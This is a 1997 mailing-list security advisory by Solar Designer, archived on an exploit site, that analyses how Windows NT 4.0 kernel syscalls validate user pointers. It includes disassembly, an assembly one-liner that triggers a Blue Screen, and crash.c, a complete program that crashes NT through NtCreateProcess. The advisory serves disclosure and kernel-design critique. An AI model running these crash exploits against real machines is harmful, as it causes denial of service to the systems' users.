@@ -1,0 +1,281 @@
+                           NT Syscalls insecurity
+
+Description: In this excellent paper, Solar Designer points out a number of
+serious flaws in the Micro$oft NT syscall implementations. He demonstrates
+code that will crash NT boxes, and points out that even more serious holes
+could probably be found by examining other syscalls.
+Author: Solar Designer <solar@FALSE.COM> (This guy rocks!)
+Compromise: Crash NT, possibly bypass security
+Vulnerable Systems: Windoze NT 4.0 and earlier
+Date: 19 October 1997
+
+Date: Sun, 19 Oct 1997 04:02:34 -0300
+From: Solar Designer <solar@FALSE.COM>
+To: BUGTRAQ@NETSPACE.ORG
+Subject: WinNT syscalls insecurity
+
+Hello!
+
+In this message, I'm going to describe several problems with the way WinNT
+syscalls are implemented. I will only be talking about DoS attacks now (of
+course, there're similar problems that allow gaining extra access, too). I
+admit the problems are not too serious since most people think NT is not too
+stable anyway. However, Microsoft put a lot of code into the NT kernel to
+protect against such attacks. Also, NT can't be considered a replacement for
+UNIX when any user allowed to run programs (possibly remotely) can halt the
+entire system.
+
+Some of the problems described here apply to other systems also. I suggest
+that kernel developers read this message even if they aren't using NT.
+
+1. Introduction.
+
+Here's some [already known] information to make sure everyone understands
+the stuff I'll be talking about. More information can be found at sites
+like www.ntinternals.com.
+
+The NT kernel is located in NTOSKRNL.EXE, while KERNEL32.DLL is just like
+libc in UNIX (it runs at user level). There's also NTDLL.DLL (running at
+user level, too) which got simple functions that do the actual syscalls
+and are called by KERNEL32.DLL larger functions. Syscalls are done via INT
+2Eh, the syscall number is passed in EAX, while EDX points to stack frame
+with parameters.
+
+2. The stack frame.
+
+All the syscall parameters are passed via the stack frame. Since the user
+program could put any address (possibly invalid) in EDX, the kernel should
+check if the parameters are readable before trying to use them. This is
+done by copying the stack frame into a buffer allocated on kernel stack,
+and handling the faults at this instruction a different way. Here's the
+syscall entry code (all addresses in this message are for NTOSKRNL from
+NT 4.0 build 1381):
+
+8013B4DF                 mov     esi, edx        ; params in user space
+8013B4E1                 mov     ebx, [edi+0Ch]
+8013B4E4                 xor     ecx, ecx
+8013B4E6                 mov     cl, [eax+ebx]   ; params size
+8013B4E9                 mov     edi, [edi]
+8013B4EB                 mov     ebx, [edi+eax*4] ; handler
+8013B4EE                 sub     esp, ecx        ; space for the copy
+8013B4F0                 shr     ecx, 2          ; params count
+8013B4F3                 mov     edi, esp        ; copy buffer
+8013B4F5 copyin_move:                            ; DATA XREF: _text:8013E59Ao
+8013B4F5                 rep movsd
+8013B4F7                 call    ebx
+8013B4F9 copyin_fault:                           ; DATA XREF: _text:8013E5B0o
+
+And the relevant part of page fault handler:
+
+8013E59A copyin_check:                           ; CODE XREF: _text:8013E54Fj
+8013E59A                 mov     ecx, offset copyin_move
+8013E59F                 cmp     [ebp+68h], ecx
+8013E5A2                 jnz     short loc_8013E5C4
+...
+8013E5B0                 mov     dword ptr [ebp+68h], offset copyin_fault
+8013E5B7                 mov     eax, 0C0000005h ; NT status: access denied
+
+If a page fault occurs at 'rep movsd', the fault handler will set NT status
+and skip calling the syscall handler. This approach (which is widely used in
+UNIX, too) would work just fine if properly implemented. Unfortunately, it's
+not.
+
+One of the problems is that it is possible to get a general protection fault
+instead of a page fault by accessing a 4 byte word at addresses 0FFFFFFFDh
+to 0FFFFFFFFh. The exploit can be (in a native Win32 application):
+
+xor eax,eax     ; any valid syscall number that has at least one parameter
+mov edx,-1      ; an invalid address to cause a GPF
+int 2Eh         ; Blue Screen, wait for the admin to push the reset button
+
+The other problem is that some page faults are completely legal since they
+are used to implement virtual memory. That's why the page fault handler
+checks for these first. Unfortunately, if it detects a page fault outside
+of the paged area, it calls KeBugCheck (the Blue Screen stuff) immediately,
+before copyin_check has a chance to execute. This can be exploited with
+addresses like 0F0000000h.
+
+3. Other pointers.
+
+Unlike UNIX syscalls, most NT ones have to accept at least one pointer from
+the user space (not counting the stack frame pointer described above). The
+reason is that the only way for syscalls to return a value (other than NT
+status) is writing it to a supplied buffer. For example, NtOpenFile accepts
+a pointer to where it can store the file handle.
+
+There're lots more syscalls in NT, compared to UNIX. For example, when I was
+looking for a way to execute a program with syscalls only (to improve my
+shellcode), I started with figuring out the NtCreateProcess parameters (and
+occasionally found a hole in it [Blue Screen on some invalid file handles
+due to accessing fields in a structure referenced by a NULL pointer]). Then
+it turned out I have to open the file manually first, do NtCreateSection,
+and the DLL initialization. After that (and some other tricks) there's one
+more syscall to start the thread. The relevant KERNEL32 (think: libc) code
+is several kilobytes large, which is definitely not suitable for shellcode,
+so I had to give up.
+
+In NT, user space pointers are valid in the kernel. This makes it easy to
+forget to do the necessary checking in some syscall. Combined with the large
+number of such pointers, this means there are some such holes (some of them
+may be writes, which means a possibility for gaining extra privilege).
+
+For some unknown reason, the syscalls don't use the copy-and-catch-faults
+approach described above for pointers other than the stack frame one. They
+check the address manually instead, and access the memory without copying.
+This leaves another possibility for bugs: it is easy to check less bytes
+than are accessed in reality. Read more about it below.
+
+4. Integer overflows.
+
+Let's look at a typical address range check (there're lots of them in NT
+kernel), and the way the memory is accessed afterwards:
+
+80132F4D addr_check:                             ; CODE XREF: _text:80132F44j
+80132F4D                 lea     ecx, [eax+esi*4] ; end = start + count * 4
+80132F50                 cmp     ecx, eax
+80132F52                 jb      short addr_overflow ; end < start
+80132F54                 cmp     ecx, 7FFF0000h
+80132F5A                 jbe     short addr_okay
+80132F5C addr_overflow:                          ; CODE XREF: _text:80132F52j
+80132F5C                 call    ExRaiseAccessViolation
+80132F61 addr_okay:                              ; CODE XREF: _text:80132F5Aj
+80132F61                 xor     edi, edi        ; zero
+80132F63                 mov     [ebp-28h], edi
+80132F66                 mov     eax, [ebp+0Ch]  ; the same thing
+80132F69                 lea     edx, [eax+edi*4] ; src
+80132F6C                 lea     ecx, [ebp+edi*4-34Ch] ; dst
+80132F73                 mov     eax, esi        ; count
+80132F75                 sub     eax, edi
+80132F77 addr_loop:                              ; CODE XREF: _text:80132F85j
+80132F77                 mov     edi, [edx]      ; *dst++ = *src++ >> 2
+80132F79                 shr     edi, 2
+80132F7C                 mov     [ecx], edi
+80132F7E                 add     edx, 4
+80132F81                 add     ecx, 4
+80132F84                 dec     eax             ; while (--count)
+80132F85                 jnz     short addr_loop
+
+Fortunately, there're checks for possible overflows at the addition (start +
+size). However, there's no check for the multiplication (count * 4). In this
+particular case we're lucky since the count was tested to be <= 64 above the
+piece of code I quoted, otherwise we would have a buffer overflow also.
+
+[ In reality, we do have the buffer overflow (only useful as a DoS attack)
+since some other code which I didn't quote here jumps to addr_okay if count
+is zero, which effectively means looping 2^32 times. This is not the topic
+of this message though. ]
+
+However, in some other checks, there may be no check for count before the
+address range check. In this example the count <= 64 check (BTW, unsigned)
+was far above this range check, so I assume it is outside of the range check
+macro in the sources. I'm just too lazy to search for another example with
+both a loop while (--count) and multiplication in the check. ;-)
+
+Similar potential problems are with ProbeForWrite function which is used by
+many syscalls. This function accepts the size in bytes, and there're calls
+like this:
+
+8019BEC9                 mov     eax, [esi]      ; size = buf->header.count
+8019BECB                 imul    eax, 0Ch        ; size *= sizeof(entry)
+8019BECE                 add     eax, 8          ; size += sizeof(buf->header)
+8019BED1                 push    4
+8019BED3                 push    eax             ; size
+8019BED4                 push    esi             ; buf
+8019BED5                 call    ProbeForWrite
+
+If buf->header.count is, for example, 0x80000000, this call will verify 8
+bytes. Depending on how lucky we are (possible other checks and the way the
+memory is accessed afterwards), we may or may not have a security hole.
+
+5. Other holes.
+
+Normally NT syscalls are only called by KERNEL32 functions. They're rarely
+called with invalid parameters even by buggy programs being developed on an
+NT box.
+
+For example, a buggy program could call WinExec (located in KERNEL32) with
+an invalid file name. However, no program would call NtCreateProcess with an
+invalid file handle, since NtCreateProcess is only called by KERNEL32 a few
+syscalls after NtOpenFile, both done from the same KERNEL32 function.
+
+This makes me think many syscalls won't process invalid parameters correctly
+(that is, just set NT status and exit). Some will likely crash the system. I
+suspect a program doing random syscalls with random parameters would crash
+the system quite fast, should try some day. ;^)
+
+Here goes the NtCreateProcess exploit, compile with Cygwin32, the GCC port:
+
+--- crash.c starts here ---
+
+struct exec_params1 {
+        char *unknown1, *unicode, *unknown2;
+};
+
+struct exec_params1 params1 = {
+        NULL,
+        NULL,
+        NULL
+};
+
+struct exec_params2 {
+        struct exec_params1 *params1;
+        int mask;
+        int unknown1, unknown2, unknown3;
+        int handle;
+        int unknown4, unknown5;
+};
+
+struct exec_params2 params2 = {
+        &params1,
+        0x1f0fff,
+        0,
+        -1,
+        1,
+        0x100,
+        0,
+        0
+};
+
+main() {
+        for (params2.handle = 0x80; params2.handle < 0x90; params2.handle++)
+        asm(
+                "movl $0x1f,%%eax\n"
+                "leal %0,%%edx\n"
+                "int $0x2e"
+                :
+                : "m" (params2)
+                : "ax", "cx", "bx", "dx", "si", "di", "cc"
+        );
+}
+
+--- crash.c ends here ---
+
+6. Conclusion.
+
+A good syscall implementation should make it hard to make bugs. NT's doesn't.
+
+For example, segment base addresses for user and kernel segments could be
+made different to make sure no kernel developer forgets to put extra code
+for every pointer imported from user space. The extra addition instruction
+doesn't cost much for the performance.
+
+Another thing that could be done is two functions, copyin() and copyout(),
+to both copy data in/out of the kernel and do the checking (catching the
+faults). This would make it impossible to check less bytes than are accessed,
+even if an integer overflow occurs.
+
+The number of pointers in syscall parameters could be reduced, for example,
+by adding a return value in a register. NTDLL.DLL, running at user level,
+could put it where needed, so the NTDLL's function would still return NT
+status as it does now.
+
+Until Microsoft does at least some of these things, it is safe to assume
+that any user can crash an NT box. Fixing particular holes only won't do
+much since there're just too many opportunities for bugs.
+
+Signed,
+Solar Designer
+
+Addendum(if any):
+
+[Back] to Fyodor's Exploit World!
